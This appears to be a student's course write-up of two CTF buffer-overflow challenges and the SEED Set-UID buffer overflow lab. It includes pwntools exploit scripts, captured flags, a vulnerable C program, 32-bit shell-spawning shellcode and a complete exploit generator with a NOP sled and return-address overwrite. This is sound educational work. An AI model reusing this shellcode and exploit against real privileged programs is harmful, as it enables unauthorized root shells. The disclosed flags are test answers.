# Trabalho realizado na Semana #5


---

## CTF

### Week 5 - Challenge 1

The mem.txt file is opened, read and printed. Therefore, to change the file read, we overrode the meme_file variable through the scanf function call. This function reads 28 bytes to the buffer variable, which has only 20 bytes of space. The other 8 bytes correspond to the meme_file variable.

We altered the given python code to run our attack and find the flag:

```
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"12345678901234567890flag.txt")
r.interactive()
```

![](https://i.imgur.com/pfxsmM0.png)

Flag:
```
flag{cf7021e744f2bc2a75e134e62d60bdf9}
```

### Week 5 - Challenge 2


The next challenge was very similar to the previous one. We noticed a new variable called val with 4 bytes whose value had to be a specific one to pass the condition and open the file.

To change the file read, we overrode val and meme_file variables through the scanf function call. This function reads 32 bytes to the buffer variable, which has only 20 bytes of space. The 4 bytes after the first 20 bytes read, correspond to the val value, which needed to be `xfefc2223`. Because the variables are written in the stack bottom-up, these val bytes must be written in reverse order, `\x23\x22\xfc\xfe`. The other 8 bytes correspond to the meme_file variable.


We altered the given python code to run our attack and find the flag:
```
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")
r.sendline(b"1" * 20 + b"\x23\x22\xfc\xfe" + b"flag.txt")
r.interactive()
```

![](https://i.imgur.com/GvbTPw9.png)

Flag:
```
flag{58073dcba2977777b74da5782c31a91a}
```


---


## Buffer Overflow Attack Lab (Set-UID Version)

### Task 1

Both the binaries open a shell where we can run some code:

![](https://i.imgur.com/cpwSfRb.png)


### Task 2

In this task we are presented with the following code:

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r"); 
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}

```

This code reads from a file, badfile, which will be the entry point of the attack. It reads 517 bytes of data and then invokes dummy_function() which, in turn, calls bof() function who calls a strcpy instruction to assign those 217 bytes to an array, buffer, with only 100 bytes.

The buffer overflow will cause harm in those 417 bytes in excess.

After compilation we are required to change the premissions of the resultant object file to gain Set-UID privileges.

Because the compilation and setup commands are already included in Makefile, we just needed to type <kbd>make</kbd>.

![](https://i.imgur.com/lURTDYR.png)



### Task 3

Running GDB on the debug binary, we got the following addresses:

![](https://i.imgur.com/TJXqU4V.png)


After knowing these values we needed to prepare the badfile which will be read by the binary. In order to do so, we completed the python base attack, exploit.py, given by the lab.

Firstly, we needed to complete the shellcode section correctly.

After inspecting the Makefile provided we noticed that stack-L1 was compiled using flag -m32

```
FLAGS    = -z execstack -fno-stack-protector
FLAGS_32 = -m32
TARGET   = stack-L1 stack-L2 stack-L3 stack-L4 stack-L1-dbg stack-L2-dbg stack-L3-dbg stack-L4-dbg
...
```
This means this is a 32 bit architecture so the correct shellcode to use in this architecture is the following (which was provided in the call_shellcode.c in task 1):

```
"shellcode= (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')
```


Secondly, we needed to decide where in the buffer would our shellcode be. Because we will be filling the buffer’s content with NOP’S, to make our chances of landing in one of them higher, we need to get the most NOP’S that we could possibly get. With this in mind, we decided that the best position would be at the end of the buffer. This could be done by pushing the shellcode to the end of the available buffer space and because our buffer has length 517, this position would be:

```
start = 517 - len(shellcode)   
```


Thirdly, we needed to change the return adress value to one that we know would run our code.

We know that if the address points to any NOP’S between the place where the address is and the shellcode, we are sure that the shellcode will run. We also know ebp value so we added to ebp value the value 0x88 to achieve the return adress.

```
ret = 0xffffcb48 + 0x88 
```

Finally, the result of <kbd>ebp - buffer</kbd> gives us the offset that we need to change de ebp value (108). Because the ebp value is right before the return address value and the architecture is 32 bit, the adresses are 4 bytes long. In order to change the return address, we need to give it an offset of <kbd>(ebp - buffer) + 4</kbd> which is:

```
offset = 112
```

Ending up with the following python script:

```
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcb48 + 0x88       # Change this number 
offset = 112              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

After running the above code and generating the badfile, we ran our code and opened a shell when running stack-L1 binary, as expected:

![](https://i.imgur.com/yZKOkDH.png)

